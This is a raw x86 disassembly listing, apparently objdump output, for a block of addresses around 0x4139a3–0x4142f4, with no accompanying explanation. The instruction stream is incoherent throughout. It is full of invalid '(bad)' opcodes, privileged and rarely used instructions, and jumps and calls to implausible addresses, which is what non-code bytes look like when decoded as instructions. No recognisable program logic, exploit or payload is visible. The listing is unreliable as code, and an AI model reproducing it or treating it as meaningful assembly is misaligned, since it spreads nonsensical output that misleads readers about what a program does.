  4139a3:	lods   al,BYTE PTR ds:[esi]
  4139a4:	mov    al,ds:0x24042108
  4139a9:	dec    ebx
  4139aa:	jmp    0x4139af
	...
  4139c0:	mov    esp,fs
  4139c2:	pop    es
  4139c3:	icebp  
  4139c4:	lahf   
  4139c5:	aad    0xdf
  4139c7:	sbb    ah,BYTE PTR [eax+0x78d89788]
  4139cd:	xor    DWORD PTR [esi-0x4d],0xa
  4139d1:	or     DWORD PTR [ebx+ebp*1+0x1f],esi
  4139d5:	cwde   
  4139d6:	fild   WORD PTR [ebx]
  4139d8:	push   esp
  4139d9:	(bad)  
  4139da:	pop    ds
  4139db:	nop
  4139dc:	lea    ebp,[edi-0x5e]
  4139df:	sbb    ah,BYTE PTR [eax-0x80]
  4139e2:	(bad)  
  4139e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139e4:	pop    edi
  4139e5:	aad    0xdf
  4139e7:	sbb    ah,BYTE PTR [eax+0x7c]
  4139ea:	push   edi
  4139eb:	dec    eax
  4139ec:	mov    BYTE PTR [edi+ebx*8+0x88fcf86],dl
  4139f3:	shl    esp,0x6
  4139f6:	dec    eax
  4139f7:	jmp    0xe94d8763
  4139fc:	(bad)  
  4139fd:	(bad)
  413a01:	cli    
  413a02:	neg    BYTE PTR [edx+0x14582c8]
  413a08:	push   eax
  413a09:	xchg   edi,eax
  413a0a:	or     cl,ch
  413a0c:	adc    BYTE PTR [esp+edi*2-0x26],0x39
  413a11:	sbb    BYTE PTR [edi-0x17],0xa6
  413a15:	or     cl,dh
  413a17:	out    dx,al
  413a18:	or     esi,DWORD PTR [edx+0x60]
  413a1b:	mov    edx,0x5308d540
  413a20:	nop
  413a21:	sbb    eax,0xd6
	...
  413a37:	add    BYTE PTR [ebx],dl
  413a39:	jle    0x413a1b
  413a3b:	push   ecx
  413a3c:	push   edi
  413a3d:	xor    ebp,0xffffffc6
  413a40:	add    esi,DWORD PTR [edx-0x20]
  413a43:	cmp    DWORD PTR [edi-0x7d],eax
  413a46:	cmc    
  413a47:	mov    dh,0x13
  413a49:	mov    ah,al
  413a4b:	inc    ecx
  413a4c:	aaa    
  413a4d:	xor    ebp,0xffffffb0
  413a50:	leave  
  413a51:	call   0x5652c7d7
  413a56:	call   0x612b1295
  413a5b:	sbb    al,0x75
  413a5d:	ror    DWORD PTR [eax],0x81
  413a60:	cli    
  413a61:	xchg   esp,eax
  413a62:	leave  
  413a63:	jle    0x413a76
  413a65:	shr    DWORD PTR [esi+0x22],0xcf
  413a69:	xor    ebp,0x331586f5
  413a6f:	retf   
  413a70:	rcl    ah,0x8
  413a73:	jmp    0x2962d392
  413a78:	and    DWORD PTR [ebp-0x37],ecx
  413a7b:	sbb    edi,DWORD PTR es:[esi+0x8]
  413a7f:	add    ch,ah
  413a81:	xchg   ebp,eax
  413a82:	or     bh,al
  413a84:	lock popf 
  413a86:	cmc    
  413a87:	push   DWORD PTR [ebp+0x7945cd95]
  413a8d:	cwde   
  413a8e:	or     BYTE PTR [eax],al
  413a90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a91:	aam    0x4c
  413a93:	hlt    
  413a94:	mov    ch,0x95
  413a96:	or     BYTE PTR [eax],al
  413a98:	jb     0x413adb
  413a9a:	in     eax,0x0
	...
  413ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ab1:	xchg   ebp,eax
  413ab2:	or     BYTE PTR [ebp-0x72ba5a20],cl
  413ab8:	xor    BYTE PTR [ecx-0x46cf72bb],dl
  413abe:	inc    ebp
  413abf:	push   0x6a
  413ac1:	sbb    cl,BYTE PTR [esp+edi*8-0x4b]
  413ac5:	xor    al,BYTE PTR [edi]
  413ac7:	push   0x76
  413ac9:	das    
  413aca:	cmc    
  413acb:	(bad)  
  413acc:	pusha  
  413acd:	xor    eax,DWORD PTR [edx+0x41]
  413ad0:	gs push cs
  413ad2:	dec    esp
  413ad3:	call   0x12e65be
  413ad8:	or     DWORD PTR [ebp-0x50b28279],0x1225fff5
  413ae2:	jns    0x413ae3
  413ae4:	nop
  413ae5:	pushf  
  413ae6:	xchg   BYTE PTR [ebp-0x13],al
  413ae9:	pop    ss
  413aea:	je     0x413ae4
  413aec:	xor    eax,0x688b4f11
  413af1:	mov    al,ds:0x280a3fe2
  413af6:	ins    DWORD PTR es:[edi],dx
  413af7:	call   0x37a8d0
  413afc:	ins    BYTE PTR es:[edi],dx
  413afd:	inc    edx
  413afe:	aad    0xff
  413b00:	lods   eax,DWORD PTR ss:[esi]
  413b02:	push   ds
  413b03:	sub    DWORD PTR [edx-0x64],ebp
  413b06:	add    al,al
  413b08:	shl    DWORD PTR [edi-0x80],0x45
  413b0c:	mov    edi,cs
  413b0e:	mov    ds:0xf1a1e40b,eax
  413b13:	inc    BYTE PTR [eax]
	...
  413b25:	add    BYTE PTR [eax],al
  413b27:	add    bl,dl
  413b29:	fld    DWORD PTR [esi+0x12b1bdf]
  413b2f:	(bad)  
  413b30:	cmp    edi,ecx
  413b32:	cmp    BYTE PTR [edi],0x90
  413b35:	mov    dl,0xc6
  413b37:	(bad)  
  413b38:	aas    
  413b39:	sub    al,0x9
  413b3b:	(bad)  
  413b3c:	mov    esi,cs
  413b3e:	inc    ecx
  413b3f:	jb     0x413b8e
  413b41:	imul   ecx,DWORD PTR [edx+eax*8-0x14316de0],0xf
  413b49:	sbb    BYTE PTR ds:0x10d300ff,ch
  413b4f:	je     0x413ad1
  413b51:	xchg   ebx,esp
  413b53:	popa   
  413b54:	(bad)  
  413b55:	sub    al,0x9
  413b57:	(bad)  
  413b58:	leave  
  413b59:	jns    0x413b67
  413b5b:	add    BYTE PTR [ebp+ebp*2+0x54747c8c],cl
  413b62:	or     al,0x0
  413b64:	mov    eax,gs
  413b66:	pop    es
  413b67:	jmp    0xfe5e921c
  413b6c:	xadd   DWORD PTR [eax],edx
  413b6f:	(bad)  
  413b70:	mov    edi,0x38741e74
  413b75:	das    
  413b76:	mul    DWORD PTR [ecx-0x39]
  413b79:	lods   al,BYTE PTR ds:[esi]
  413b7a:	or     al,0xb8
  413b7c:	lea    ebp,[ebp+0x9]
  413b7f:	add    bh,al
  413b81:	xor    al,0x49
  413b83:	push   esp
  413b84:	pop    es
  413b85:	add    cl,BYTE PTR [edx-0x5a64c73d]
  413b8b:	dec    edi
	...
  413ba0:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  413ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ba3:	dec    DWORD PTR [ebp+ebp*2+0x11]
  413ba7:	jno    0x413b36
  413ba9:	sub    bl,BYTE PTR ds:0x8994b182
  413baf:	retf   
  413bb0:	dec    esp
  413bb1:	xchg   esp,eax
  413bb2:	fisttp WORD PTR [edi+0x5e1c1394]
  413bb8:	inc    esi
  413bb9:	aad    0xdf
  413bbb:	add    ebx,DWORD PTR [ecx-0x6a]
  413bbe:	sbb    al,BYTE PTR [edx+ebp*2-0x25]
  413bc2:	cmp    BYTE PTR [ebx+0x16],al
  413bc5:	mov    ds:0x944c9327,al
  413bca:	dec    eax
  413bcb:	jne    0x413b59
  413bcd:	xchg   esp,eax
  413bce:	fild   QWORD PTR [ebx]
  413bd0:	(bad)  
  413bd1:	lods   eax,DWORD PTR ds:[esi]
  413bd2:	push   ss
  413bd3:	pop    ss
  413bd4:	push   cs
  413bd5:	ret    0x932b
  413bd8:	dec    esp
  413bd9:	xchg   esp,eax
  413bda:	fisttp WORD PTR [edi-0x8d8086]
  413be0:	mov    cl,cl
  413be2:	and    edx,DWORD PTR [ebx-0x7cf86b34]
  413be8:	mov    ss,WORD PTR [edi+ebx*8-0x1af6b3f6]
  413bef:	sub    al,0xf5
  413bf1:	xchg   ebp,eax
  413bf2:	fild   WORD PTR [ebx]
  413bf4:	dec    ebx
  413bf5:	(bad)  
  413bf7:	add    ecx,DWORD PTR [esp+edx*4-0x7f377721]
  413bfe:	rsm    
  413c00:	dec    ebx
  413c01:	in     eax,dx
  413c02:	loope  0x413c1a
	...
  413c18:	mov    esi,0x3b044998
  413c1d:	add    ebp,esp
  413c1f:	push   ss
  413c20:	cwde   
  413c21:	ss cmp al,ch
  413c24:	sub    ecx,DWORD PTR [edx+0x6d888f9f]
  413c2a:	push   0x86948c03
  413c2f:	xchg   edx,eax
  413c30:	(bad)  
  413c31:	ins    BYTE PTR es:[edi],dx
  413c32:	fimul  WORD PTR [bp+si]
  413c35:	jg     0x413caf
  413c37:	sar    bl,0x7e
  413c3a:	or     dl,bh
  413c3c:	sti    
  413c3d:	jbe    0x413bd4
  413c3f:	jmp    0x413bd0
  413c41:	xchg   esp,eax
  413c42:	pop    eax
  413c43:	data16 cld 
  413c45:	xchg   BYTE PTR [eax+0x5e],bl
  413c48:	(bad)  
  413c49:	xchg   edx,eax
  413c4a:	pusha  
  413c4b:	jmp    0xc149d0e0
  413c50:	(bad)  
  413c51:	cwde   
  413c52:	or     cl,ch
  413c54:	ja     0x413c7f
  413c56:	or     ecx,ebp
  413c58:	(bad)  
  413c59:	mov    ecx,eax
  413c5b:	mov    ebp,0x2d4b55a6
  413c60:	(bad)  
  413c61:	xchg   esp,eax
  413c62:	or     cl,ch
  413c64:	adc    al,0xd8
  413c66:	hlt    
  413c67:	mov    ecx,0xeb5f7ef5
  413c6c:	or     BYTE PTR [eax],0xf1
  413c6f:	or     DWORD PTR [edi-0x5d128681],0xffffffa8
  413c76:	scas   al,BYTE PTR es:[edi]
  413c77:	mov    dl,0x48
  413c79:	jle    0x413c7d
  413c7b:	sub    DWORD PTR [eax],eax
	...
  413c8d:	add    BYTE PTR [eax],al
  413c8f:	add    BYTE PTR [ebx],cl
  413c91:	mov    ebp,?
  413c93:	je     0x413c2c
  413c95:	jne    0x413c22
  413c97:	inc    BYTE PTR [eax+0x7919e17e]
  413c9d:	or     cl,dh
  413c9f:	shl    ebp,0xa6
  413ca2:	cmc    
  413ca3:	into   
  413ca4:	mov    ecx,0x9028357d
  413ca9:	push   ebp
  413caa:	dec    ebx
  413cab:	mov    ebp,0xe9089488
  413cb0:	adc    bl,cl
  413cb2:	hlt    
  413cb3:	sbb    esi,esp
  413cb5:	jge    0x413d16
  413cb7:	jmp    0x413cb1
  413cb9:	jmp    0x413cc3
  413cbb:	sahf   
  413cbc:	std    
  413cbd:	xchg   ecx,eax
  413cbe:	cmc    
  413cbf:	cld    
  413cc0:	mov    ecx,0x84e947ca
  413cc5:	push   esp
  413cc6:	add    eax,0xf5e97900
  413ccb:	push   ebp
  413ccd:	ror    BYTE PTR [eax+ebx*8-0x3b],0x91
  413cd2:	or     BYTE PTR [eax],al
  413cd4:	sub    bh,BYTE PTR [esi]
  413cd6:	rol    DWORD PTR [ecx],1
  413cd8:	cmc    
  413cd9:	xchg   ecx,eax
  413cda:	or     bh,bh
  413cdc:	(bad)  
  413cdd:	jge    0x413c65
  413cdf:	inc    ebp
  413ce0:	inc    ebp
  413ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ce2:	jp     0x413cec
  413ce4:	xor    bh,BYTE PTR ds:0xa9f8c7e9
  413cea:	cmc    
  413ceb:	push   DWORD PTR [ebp+0x5145cd91]
  413cf1:	cwde   
  413cf2:	or     BYTE PTR [eax],al
	...
  413d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d09:	ror    BYTE PTR [eax+esi*8-0x4b],0x91
  413d0e:	or     BYTE PTR [eax],al
  413d10:	push   0x3d
  413d12:	stc    
  413d13:	add    BYTE PTR [ebp-0x1772f76f],ah
  413d19:	mov    ecx,0xa608ff45
  413d1e:	in     eax,dx
  413d1f:	in     eax,0x76
  413d21:	xchg   ecx,eax
  413d22:	or     BYTE PTR [ebx],cl
  413d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d25:	and    al,0x1d
  413d27:	and    eax,0xffffff8d
  413d2a:	cmc    
  413d2b:	jae    0x413d89
  413d2d:	test   al,0x7c
  413d2f:	hlt    
  413d30:	bnd jle 0x413d10
  413d33:	dec    eax
  413d34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d35:	cwde   
  413d36:	int    0x45
  413d38:	sbb    DWORD PTR [edx-0x53cafff8],edx
  413d3e:	push   cs
  413d3f:	(bad)  
  413d40:	push   0x25fff5c4
  413d45:	xchg   ecx,eax
  413d46:	cmc    
  413d47:	jne    0x413d2a
  413d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d4a:	sbb    al,0x9a
  413d4c:	pop    esi
  413d4d:	push   ecx
  413d4e:	cmc    
  413d4f:	or     dh,ch
  413d51:	or     al,0x13
  413d53:	call   0xfe5386e4
  413d58:	adc    ebp,edx
  413d5a:	ficom  WORD PTR [ecx+0xcac57]
  413d60:	js     0x413dd7
  413d62:	sbb    al,0x14
  413d64:	push   ds
  413d65:	mov    dl,0xc9
  413d67:	dec    edx
  413d69:	ja     0x413d9c
  413d6b:	inc    edi
	...
  413d80:	dec    ebp
  413d81:	imul   ecx,DWORD PTR [edx],0x0
  413d84:	mov    ebx,gs
  413d86:	mov    BYTE PTR [eax+eax*8+0x6a],bh
  413d8a:	test   DWORD PTR [edx],ecx
  413d8c:	shl    DWORD PTR [edi+0x5],cl
  413d8f:	inc    BYTE PTR [ecx-0x29]
  413d92:	and    DWORD PTR [ebx-0xf69471],ecx
  413d98:	inc    ecx
  413d99:	(bad)  
  413d9a:	and    DWORD PTR [ebx-0x73],esi
  413d9d:	imul   ecx,DWORD PTR [ecx],0xfffffffc
  413da0:	pop    edi
  413da1:	stos   DWORD PTR es:[edi],eax
  413da2:	push   edx
  413da3:	(bad)  
  413da4:	mov    ds:0xeaf11c9d,eax
  413da9:	(bad)  
  413daa:	hlt    
  413dab:	push   cs
  413dac:	or     DWORD PTR [ecx+0x1c],ecx
  413daf:	dec    BYTE PTR [ebx+0x670af107]
  413db5:	imul   esi,DWORD PTR [esi+0x66],0x7a
  413db9:	sbb    DWORD PTR [ecx],0xffffffb7
  413dbc:	lea    ebp,[ebp+0x9]
  413dbf:	add    bl,cl
  413dc1:	(bad)  
  413dc2:	xor    eax,edx
  413dc4:	mov    ecx,0x50822906
  413dc9:	bound  edi,QWORD PTR [edi+edx*2+0x410b78e4]
  413dd0:	mov    WORD PTR [ebp-0x62],ss
  413dd3:	add    BYTE PTR [edi+0x3b],cl
  413dd6:	xchg   esi,eax
  413dd7:	push   DWORD PTR [ebx]
  413dd9:	out    dx,al
  413dda:	push   cs
  413ddb:	add    BYTE PTR [ebp+edx*2-0x6ad4df26],cl
  413de2:	scas   al,BYTE PTR es:[edi]
  413de3:	sbb    al,0x0
	...
  413df5:	add    BYTE PTR [eax],al
  413df7:	add    BYTE PTR [eax],ah
  413df9:	adc    BYTE PTR [esi-0x39b4cced],0x12
  413e00:	adc    ch,BYTE PTR [ebp-0x7b]
  413e03:	jmp    0x413e0f
  413e05:	jl     0x413e01
  413e07:	inc    ebx
  413e08:	jg     0x413db1
  413e0a:	xchg   edi,eax
  413e0b:	sub    eax,0xff7e7bb3
  413e10:	xor    eax,DWORD PTR [ecx]
  413e12:	jmp    0xe3c4:0xbc27904a
  413e19:	xchg   esp,eax
  413e1a:	fild   WORD PTR [ebx]
  413e1c:	mov    esp,gs
  413e1e:	loopne 0x413e24
  413e20:	mov    WORD PTR [edi+eax*2+0x4e7ba1c2],ss
  413e27:	xlat   BYTE PTR ds:[bx]
  413e29:	pop    es
  413e2a:	mov    eax,ds:0x3bd1d303
  413e2f:	add    eax,0x80df948d
  413e34:	push   eax
  413e35:	js     0x413de6
  413e37:	adc    bl,BYTE PTR [eax+0x48]
  413e3a:	xchg   edx,eax
  413e3b:	les    ebx,FWORD PTR [ebx-0x73fa688d]
  413e41:	xchg   esp,eax
  413e42:	jmp    0x57d9:0xea20043
  413e49:	pop    es
  413e4a:	mov    eax,ds:0xd5896403
  413e4f:	adc    dh,BYTE PTR [edx+0x53]
  413e52:	in     al,dx
  413e53:	aas    
  413e54:	(bad)  
  413e56:	fild   WORD PTR [ebx]
  413e58:	mov    WORD PTR [edi+ebx*8+0x1b],ss
	...
  413e6f:	add    BYTE PTR [ecx+0x6b12de98],bh
  413e75:	mov    ecx,0xec4a12f8
  413e7a:	adc    eax,0xd794cccb
  413e7f:	cmp    DWORD PTR [eax+0x7b],eax
  413e82:	or     BYTE PTR [esi+0x625b5670],dh
  413e88:	mov    ecx,ebx
  413e8a:	push   eax
  413e8b:	adc    edx,ecx
  413e8d:	xchg   ebp,eax
  413e8e:	inc    edi
  413e8f:	jmp    0xaa49441b
  413e94:	jle    0x413e83
  413e96:	or     BYTE PTR [ecx-0x16f76bb0],al
  413e9c:	push   edi
  413e9d:	jnp    0x413e94
  413e9f:	jmp    0xee0b8c33
  413ea4:	(bad)  
  413ea5:	in     al,0x50
  413ea7:	add    DWORD PTR [esi-0x6816b86b],ebx
  413ead:	add    eax,0xf37e2a08
  413eb2:	mov    ecx,0xed7ac8eb
  413eb7:	adc    DWORD PTR [eax-0x52aef76c],0x973ef579
  413ec1:	int3   
  413ec2:	sti    
  413ec3:	ss sahf 
  413ec5:	jae    0x413eac
  413ec7:	ss jle 0x413f44
  413eca:	loopne 0x413f0c
  413ecc:	xchg   edi,eax
  413ecd:	jp     0x413ec4
  413ecf:	push   0xffffffbc
  413ed1:	and    eax,0xa843
	...
  413ee6:	add    BYTE PTR [eax],al
  413ee8:	(bad)  
  413ee9:	xchg   esp,eax
  413eea:	jl     0x413edc
  413eec:	adc    bh,BYTE PTR [ecx+0x7a48b29a]
  413ef2:	cmc    
  413ef3:	jne    0x413e7a
  413ef5:	jns    0x413f12
  413ef7:	pop    ebx
  413ef8:	xor    dl,ch
  413efa:	or     BYTE PTR [esi],ah
  413efc:	xchg   esp,eax
  413efd:	pop    esp
  413efe:	inc    eax
  413eff:	sub    BYTE PTR [eax+0xfe90893],cl
  413f05:	jb     0x413f24
  413f07:	aad    0x7d
  413f09:	jp     0x413eeb
  413f0b:	repz call 0x5d40:0xf600f57a
  413f13:	push   0x479140
  413f18:	std    
  413f19:	and    cl,BYTE PTR [eax]
  413f1b:	ret    
  413f1c:	cli    
  413f1d:	cwde   
  413f1e:	cmp    eax,0xaf963501
  413f23:	pop    es
  413f24:	and    eax,0xd7330896
  413f29:	fwait
  413f2a:	clc    
  413f2b:	sbb    DWORD PTR [edi],0xffffff92
  413f2e:	jnp    0x413f32
  413f30:	push   ds
  413f31:	xchg   ebx,eax
  413f32:	loope  0x413f1d
  413f34:	sbb    eax,0x7afff616
  413f39:	cwde   
  413f3a:	jp     0x413f36
  413f3c:	jp     0x413ee1
  413f3e:	pop    edi
  413f3f:	add    BYTE PTR ds:0xe5000859,bh
  413f45:	mov    ecx,0x171125f6
  413f4a:	dec    eax
	...
  413f5f:	add    BYTE PTR [edx+0x71],bl
  413f62:	pop    ebp
  413f63:	xor    esp,0x1925f595
  413f69:	pop    ss
  413f6a:	dec    eax
  413f6b:	add    BYTE PTR [edx+0x71],bh
  413f6e:	push   ebp
  413f6f:	xor    esp,0x1125f595
  413f75:	pop    ss
  413f76:	dec    eax
  413f77:	add    BYTE PTR [edx+0x71],bh
  413f7a:	ins    DWORD PTR es:[edi],dx
  413f7b:	and    esp,0x925f595
  413f81:	pop    ss
  413f82:	dec    eax
  413f83:	add    BYTE PTR [edx+0x24816571],cl
  413f89:	xchg   ebp,eax
  413f8a:	cmc    
  413f8b:	and    eax,0x4816f1
  413f90:	jp     0x414004
  413f92:	jge    0x413f15
  413f94:	mov    ah,0x90
  413f96:	cmc    
  413f97:	and    eax,0x4815b9
  413f9c:	mov    WORD PTR [edx-0x12],fs
  413f9f:	jg     0x413fae
  413fa1:	lods   al,BYTE PTR ds:[esi]
  413fa2:	or     al,0xff
  413fa4:	imul   esp,edi,0x3a8c408a
  413faa:	out    dx,al
  413fab:	xchg   DWORD PTR ds:0x71ff0cac,ecx
  413fb1:	xlat   BYTE PTR ds:[ebx]
  413fb2:	mov    al,BYTE PTR [eax-0x74]
  413fb5:	xor    ch,dh
  413fb7:	(bad)  
  413fb8:	or     eax,0x69ff0cac
  413fbd:	test   DWORD PTR [edx-0x11f573c0],0x97
	...
  413fd7:	add    BYTE PTR ds:0xb1ff0cac,cl
  413fdd:	xlat   BYTE PTR ds:[ebx]
  413fde:	mov    al,BYTE PTR [eax-0x74]
  413fe1:	add    ch,bh
  413fe3:	lahf   
  413fe4:	or     eax,0xa9ff0cac
  413fe9:	pop    es
  413fea:	mov    al,BYTE PTR [eax-0x74]
  413fed:	(bad)  
  413fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ff0:	or     eax,0x71ff092c
  413ff5:	test   DWORD PTR [edx-0x112d73c0],0x92c0daf
  413fff:	jmp    FWORD PTR [ecx-0x9]
  414002:	mov    al,BYTE PTR [eax-0x74]
  414005:	stos   BYTE PTR es:[edi],al
  414006:	out    dx,al
  414007:	mov    bh,0xd
  414009:	sub    al,0x9
  41400b:	push   DWORD PTR [ecx-0x29]
  41400e:	mov    al,BYTE PTR [eax-0x74]
  414011:	mov    ds:0x2d0dbfee,al
  414016:	or     edi,edi
  414018:	test   eax,0x8c408aa9
  41401d:	jbe    0x41400a
  41401f:	(bad)  
  414020:	or     eax,0xb1ff092d
  414025:	cdq    
  414026:	mov    al,BYTE PTR [eax-0x74]
  414029:	xchg   esp,eax
  41402a:	out    dx,al
  41402b:	jmp    0x461567b
  414030:	push   ebx
  414031:	mov    dl,0xb3
  414033:	test   esp,ecx
  414035:	xchg   esp,eax
  414036:	(bad)  
  414037:	jmp    0x4615697
	...
  414050:	cmp    esi,DWORD PTR [edx-0x6b337a6d]
  414056:	mov    esi,0x20164be9
  41405b:	add    al,0x23
  41405d:	mov    dl,0x83
  41405f:	test   esp,ecx
  414061:	xchg   esp,eax
  414062:	xchg   esi,eax
  414063:	jmp    0x4615693
  414068:	or     esi,DWORD PTR [edx-0x6bb37a8d]
  41406e:	mov    gs,ecx
  414070:	jmp    0x414087
  414072:	and    BYTE PTR [ebx+esi*8],al
  414075:	mov    cl,0x73
  414077:	test   DWORD PTR [esp+edx*4+0x66],ecx
  41407b:	jmp    0x3e1565b
  414080:	(bad)  [ecx-0x6bb37aad]
  414086:	pop    esi
  414087:	jmp    0x3e15657
  41408c:	ret    
  41408d:	mov    cl,0xe3
  41408f:	or     DWORD PTR [esp+edx*4+0x36],0xa0128be9
  414097:	add    ebp,DWORD PTR [ebx+0x4c81d3b1]
  41409d:	xchg   esp,eax
  41409e:	cs jmp 0x3e1532f
  4140a4:	xchg   ebx,eax
  4140a5:	mov    cl,0xf3
  4140a7:	or     esp,0x9be90694
  4140ad:	adc    ah,BYTE PTR [eax-0x2c4e84fd]
  4140b3:	add    DWORD PTR [eax],0x0
	...
  4140c5:	add    BYTE PTR [eax],al
  4140c7:	add    ah,cl
  4140c9:	xchg   esp,eax
  4140ca:	or     dh,dh
  4140cc:	je     0x414065
  4140ce:	mov    ch,BYTE PTR [eax+0x112b778f]
  4140d4:	push   cs
  4140d5:	aam    0x8
  4140d7:	fisub  WORD PTR [ebx+ebp*4-0x76]
  4140db:	sub    BYTE PTR [eax+0xe192b77],dl
  4140e1:	aam    0x8
  4140e3:	(bad)  
  4140e4:	and    al,0xc3
  4140e6:	mov    ch,BYTE PTR [eax]
  4140e8:	mov    BYTE PTR [edi+0x2b],dh
  4140eb:	icebp  
  4140ec:	or     eax,0x34ae08d4
  4140f1:	mov    ebx,0x7790288a
  4140f6:	sub    esp,DWORD PTR ds:0x9608d40e
  4140fc:	hlt    
  4140fd:	retf   0x288a
  414100:	mov    BYTE PTR [edi+0x2b],dh
  414103:	sbb    DWORD PTR [esi],ecx
  414105:	aam    0x8
  414107:	jle    0x4140ed
  414109:	loop   0x414095
  41410b:	sub    BYTE PTR [eax+0xe112b77],dl
  414111:	aam    0x8
  414113:	data16 in al,0xda
  414116:	mov    ch,BYTE PTR [eax-0x36d48871]
  41411c:	or     eax,0xb44e08d4
  414121:	repnz mov ch,BYTE PTR [eax-0x2ed48871]
  414128:	or     eax,0x3608d4
	...
  41413d:	add    BYTE PTR [eax],al
  41413f:	add    BYTE PTR [edx+ebp*8+0x778fa88a],dh
  414146:	sub    ebx,DWORD PTR [ecx+0x1e08d40d]
  41414c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41414d:	add    cl,BYTE PTR [ebx+0x2b758fa8]
  414153:	lea    ecx,ds:0x920008d5
  414159:	ins    BYTE PTR es:[edi],dx
  41415a:	mov    DWORD PTR [edx+0x25f59224],eax
  414160:	in     eax,dx
  414161:	adc    ecx,DWORD PTR [eax+0x0]
  414164:	jb     0x4141d4
  414166:	test   DWORD PTR [edx+0x25f590a4],eax
  41416c:	fst    DWORD PTR [edx]
  41416e:	dec    eax
  41416f:	add    BYTE PTR [edx+0x6e],ah
  414172:	popf   
  414173:	xor    BYTE PTR [eax+edx*4-0xb],0x25
  414178:	mov    cl,0x12
  41417a:	dec    eax
  41417b:	add    dl,dh
  41417d:	ins    DWORD PTR es:[edi],dx
  41417e:	xchg   ebp,eax
  41417f:	xor    BYTE PTR [eax+edx*4-0xb],0x25
  414184:	or     DWORD PTR [ebx],edx
  414186:	dec    eax
  414187:	add    dl,dh
  414189:	ins    DWORD PTR es:[edi],dx
  41418a:	mov    eax,ds:0xf5906482
  41418f:	and    eax,0x481265
  414194:	adc    ch,BYTE PTR [esi-0x47]
  414197:	and    BYTE PTR [eax+edx*4+0x124d25f5],0x48
  41419f:	add    BYTE PTR [edx+0x6d],ah
  4141a2:	mov    cl,0x82
	...
  4141b8:	mov    ah,0x90
  4141ba:	cmc    
  4141bb:	and    eax,0x4812a5
  4141c0:	xor    ch,BYTE PTR [ebp-0x37]
  4141c3:	xor    ah,0x91
  4141c6:	cmc    
  4141c7:	and    eax,0x48126d
  4141cc:	push   edx
  4141cd:	ins    DWORD PTR es:[edi],dx
  4141ce:	rol    DWORD PTR [edx+0x25f591e4],0x85
  4141d5:	adc    cl,BYTE PTR [eax+0x0]
  4141d8:	jb     0x414247
  4141da:	fld    QWORD PTR [edx+0x25f591e4]
  4141e0:	push   ecx
  4141e1:	adc    cl,BYTE PTR [eax+0x0]
  4141e4:	mov    edx,?
  4141e6:	shl    BYTE PTR [ebx],0x88
  4141e9:	jmp    0x6341:0x83f90104
  4141f0:	mov    WORD PTR [ebx+0x9],gs
  4141f3:	ret    0x6b90
  4141f6:	mov    bh,dh
  4141f8:	mov    al,ch
  4141fa:	icebp  
  4141fb:	mov    bh,0x8e
  4141fd:	imul   ecx,DWORD PTR [ecx],0x0
  414200:	dec    esi
  414201:	outs   dx,DWORD PTR ds:[esi]
  414202:	or     DWORD PTR [ebx+0x7867344],eax
  414208:	add    al,0x6f
  41420a:	or     DWORD PTR [eax],eax
  41420c:	mov    WORD PTR [ecx],gs
  41420e:	or     eax,0xf9530f00
  414213:	jl     0x4141a9
  414215:	add    ecx,DWORD PTR [eax+eax*1]
  414218:	mov    WORD PTR [ebx+0x47],gs
  41421b:	add    eax,DWORD PTR [eax]
	...
  41422d:	add    BYTE PTR [eax],al
  41422f:	add    BYTE PTR [edx+ebp*8-0x7c6ee0ff],cl
  414236:	inc    ecx
  414237:	pop    es
  414238:	mov    WORD PTR [ebx+0x9],gs
  41423b:	ret    0x6b88
  41423e:	mov    bh,dh
  414240:	dec    esp
  414241:	nop
  414242:	hlt    
  414243:	mov    bh,0x86
  414245:	imul   ecx,DWORD PTR [ecx],0x0
  414248:	into   
  414249:	or     WORD PTR ds:0x96b0c,di
  414250:	pop    ecx
  414251:	add    DWORD PTR [ecx+0xb],0xffffff8c
  414255:	imul   ecx,DWORD PTR [ecx],0xffffffc2
  414258:	nop
  414259:	imul   eax,esi,0xffffffff
  41425c:	mov    WORD PTR [ebx+0x9],gs
  41425f:	jge    0x4141e5
  414261:	adc    esi,ebx
  414263:	push   DWORD PTR [ebx-0x73fcb896]
  414269:	or     BYTE PTR [ecx],0x2
  41426c:	mov    WORD PTR [ebx-0x7a],gs
  41426f:	pop    es
  414270:	aam    0x93
  414272:	out    dx,eax
  414273:	add    ecx,DWORD PTR [esp+edx*4-0x4e73f8df]
  41427a:	fild   WORD PTR [edi]
  41427c:	mov    WORD PTR [esp+eax*4-0x2078bc05],ss
  414283:	add    ecx,DWORD PTR [esi+edx*2-0x6b56fc15]
  41428a:	out    0x3,eax
  41428c:	mov    ecx,?
  41428e:	out    0x4b,eax
  414290:	jg     0x414226
  414292:	fild   WORD PTR [ebx]
	...
  4142a8:	dec    esi
  4142a9:	cdq    
  4142aa:	(bad)  
  4142ac:	dec    ebx
  4142ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142ae:	fild   WORD PTR [ebx]
  4142b0:	rcr    DWORD PTR [edi+edx*4-0x208bc40e],0x45
  4142b8:	(bad)  
  4142b9:	xchg   esp,eax
  4142ba:	hlt    
  4142bb:	add    ebp,DWORD PTR [esp+edx*4-0x21]
  4142bf:	mov    BYTE PTR [ebx-0x73fc28d4],cl
  4142c5:	xchg   esp,eax
  4142c6:	mov    eax,ds:0xdfb18c00
  4142cb:	ret    
  4142cc:	or     esi,DWORD PTR [esp+ebx*1-0x4]
  4142d0:	cmp    ecx,DWORD PTR [edi+0x568c03df]
  4142d6:	jecxz  0x4142db
  4142d8:	mov    cl,0x94
  4142da:	pop    edi
  4142db:	add    al,0x8c
  4142dd:	icebp  
  4142de:	out    0x4b,eax
  4142e0:	xchg   DWORD PTR [edi+ebx*8-0x206731fd],edx
  4142e7:	(bad)  
  4142e8:	les    esi,FWORD PTR [ecx-0x6b72fc21]
  4142ee:	out    dx,al
  4142ef:	push   0xfc9321cc
  4142f4:	cdq    
